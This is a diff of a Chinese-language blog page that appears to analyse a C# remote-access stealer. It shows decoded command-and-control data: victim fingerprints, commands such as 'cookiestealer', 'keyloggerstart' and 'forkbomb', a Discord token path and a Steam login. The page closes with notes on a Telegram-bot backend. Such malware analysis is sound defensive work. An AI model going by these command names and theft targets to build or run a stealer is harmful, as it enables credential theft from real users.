+  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\System32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,
+  &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\system32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,
+  &quot; &quot;
+ ],
+ &quot;95b18fce3c280a84c447b7374258cd3b&quot;: [
+  &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;
+ ],
+ &quot;fb668fe31be77ee0a010de83c225c204&quot;: [
+  &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;,
+  &quot;454fa6055bad2c4e9b1d33b0b30b11eb&quot;,
+  &quot;ee678cc6ced5600710e600f5c8cce48e&quot;,
+  &quot;f8afc49efff2cc16b83e646c95b9e989&quot;,
+  &quot;957acf4c4fcce89f764055acf9978456&quot;,
+  &quot;f20d8d958ee4f8643f1b069f8db495c2&quot;,
+  &quot;c72a0133882ce6233c90990b8e00775c&quot;,
+  &quot;5d94deb0da6c64342915be998ce7d95f&quot;,
+  &quot;0d55fc65bc0ac96872fab9bc03ec0134&quot;,
+  &quot;df4a7df5bb1d10900476bed933716663&quot;,
+  &quot;27ef1b29586798bc372642cf969b2187&quot;,
+  &quot;3ceba6076b11c5db73cc14cc308a91a2&quot;,
+  &quot;273f06e7eb1000c68f3fe62d51cd3779&quot;,
+  &quot;d182f4586cab8bae2bde9ae10eb120c8&quot;,
+  &quot;b785a88a74f90c8913744c7ba92d0be5&quot;
+ ],
+ &quot;0e1f102a661f322dc855ed186f235900&quot;: [
+  &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;
+ ],
+ &quot;156fde0665d178eece714785060d9d42&quot;: [
+  &quot;b785a88a74f90c8913744c7ba92d0be5&quot;,
+  &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;
+ ]
+}
+{
+   &quot;11b7d19ccf1147a7a18c5d8cb8fb6bc4&quot;: [
+      &quot;09ee87aef1bcd074085f36668392f85e262716383&quot;
+   ],
+   &quot;248854911a064ebaa582d1a56b380dcf&quot;: [
+      &quot;af5ed1d2b30ebda301fbc7e20bfcd0f27de9529b&quot;
+   ],
+   &quot;56367c166cecf6b4c653b02521db5738&quot;: [
+      &quot;COMMAND::&lt;cookiestealer&gt;-DATA::&lt;&gt;&quot;,
+      &quot;COMMAND::&lt;keyloggerstart&gt;-DATA::&lt;&gt;&quot;,
+      &quot;Microphone (Realtek AC&#39;97 Audio\r\nLine In (Realtek AC&#39;97 Audio)\r\n&quot;,
+      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y&quot;,
+      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:Program Manager,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,
+      &quot;&quot;,
+      &quot;done&quot;,
+      &quot;C:\\Users\\admin\\AppData\\Roaming\\discord\\Local Storage\\&quot;,
+      &quot;N/A&quot;,
+      &quot;Login:gabriel_radrigos,Path:c:/program files/steam,Language:,steamID:&quot;,
+      &quot;4.7.2&quot;,
+      &quot;ProcName:Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz,ProcessorDescription:x86 Family 6 Model 94 Stepping 3, GenuineIntel,ProcessorArch:x86,ProcessorModel:6,NumberOfLogicalProcessors:4,BIOSVersion:DELL  - 1,BIOSManufacturer:DELL,MotherboardManufacturer:N/A,MotherboardProduct:N/A,MotherboardSerial:N/A,VideoProduct:Standard VGA Graphics Adapter,VideoDriverVer:N/A,VideoRAM:N/A B,VideoRes:1280 x 720,AV:N/A,Path:C:\\system32&quot;,
+      &quot;Name:C:\\,Type:Drive,Size:274770948096&lt;STR&gt;&quot;,
+      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\System32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,
+      &quot;ServerType:C#,ServerVer:0.2.25,isMicrophone:Y,isWebcam:N,isAdmin:Y,WinVer:Windows 7 Professional ,ACTWindow:C:\\Windows\\system32\\cmd.exe,PCName:USER-PC,UserName:admin,IpInfo:81.17.242.238\n&quot;,
+      &quot; &quot;
+   ],
+   &quot;95b18fce3c280a84c447b7374258cd3b&quot;: [
+      &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;
+   ],
+   &quot;fb668fe31be77ee0a010de83c225c204&quot;: [
+      &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;,
+      &quot;454fa6055bad2c4e9b1d33b0b30b11eb&quot;,
+      &quot;ee678cc6ced5600710e600f5c8cce48e&quot;,
+      &quot;f8afc49efff2cc16b83e646c95b9e989&quot;,
+      &quot;957acf4c4fcce89f764055acf9978456&quot;,
+      &quot;f20d8d958ee4f8643f1b069f8db495c2&quot;,
+      &quot;c72a0133882ce6233c90990b8e00775c&quot;,
+      &quot;5d94deb0da6c64342915be998ce7d95f&quot;,
+      &quot;0d55fc65bc0ac96872fab9bc03ec0134&quot;,
+      &quot;df4a7df5bb1d10900476bed933716663&quot;,
+      &quot;27ef1b29586798bc372642cf969b2187&quot;,
+      &quot;3ceba6076b11c5db73cc14cc308a91a2&quot;,
+      &quot;273f06e7eb1000c68f3fe62d51cd3779&quot;,
+      &quot;d182f4586cab8bae2bde9ae10eb120c8&quot;,
+      &quot;b785a88a74f90c8913744c7ba92d0be5&quot;
+   ],
+   &quot;0e1f102a661f322dc855ed186f235900&quot;: [
+      &quot;552b13e67562d7b564b8a0ac9f35c735d17c786b&quot;
+   ],
+   &quot;156fde0665d178eece714785060d9d42&quot;: [
+      &quot;b785a88a74f90c8913744c7ba92d0be5&quot;,
+      &quot;fd4fbcdbaa1148ef9963f5e0be6ac85a&quot;
+   ]
+}</code></pre>
 <p>其他参数值的计算方法就不过多的关注了，还是想看看具体能执行一些什么命令，有什么效果。</p>
 <h1 id="说在最后"><a href="#说在最后" class="headerlink" title="说在最后"></a>说在最后</h1><p>程序的每一次运行效果并不完全相同，怀疑与后台设定的telegram机器人相关。第一次沙箱中运行之后开启了大量cmd窗口，在数据包中同时发现了<code>COMMAND::&lt;forkbomb&gt;-DATA::&lt;&gt;</code>编码之后的数据，之后重新运行未发生大量cmd窗口的情况，数据包中也未出现“forkbomb”相关字样。下图为某次本地运行之后的效果，恶意程序启动了系统中的一些程序来试图转移注意力</p>
 <div align=center><img src="./本地某次运行效果.png" alt="本地某次运行效果" width="70%" height="70%"  /></div>
@@ -241,8 +401,8 @@
                     </dl>
                 </div>
                 <ul>
-                    <li><a href="/">12 <p>Articles</p></a></li>
-                    <li><a href="/categories">12 <p>Categories</p></a></li>
+                    <li><a href="/archives">12 <p>Articles</p></a></li>
+                    <li><a href="/categories">11 <p>Categories</p></a></li>
                     <li><a href="/tags">19 <p>Tags</p></a></li>
                 </ul>
             </div>
@@ -274,13 +434,8 @@
         &copy; 2020
         <span class="gradient-text">
             熬夜脑阔疼
-        </span>.
-        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
-        Theme
-        <span class="gradient-text">
-            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
         </span>
-        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+
     </p>
 </footer>
 
@@ -398,14 +553,6 @@
 
     
 <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
-
-
-    
-<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/c/c.min.js"></script>
-
-
-    
-<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/c++/c++.min.js"></script>
 
 
 
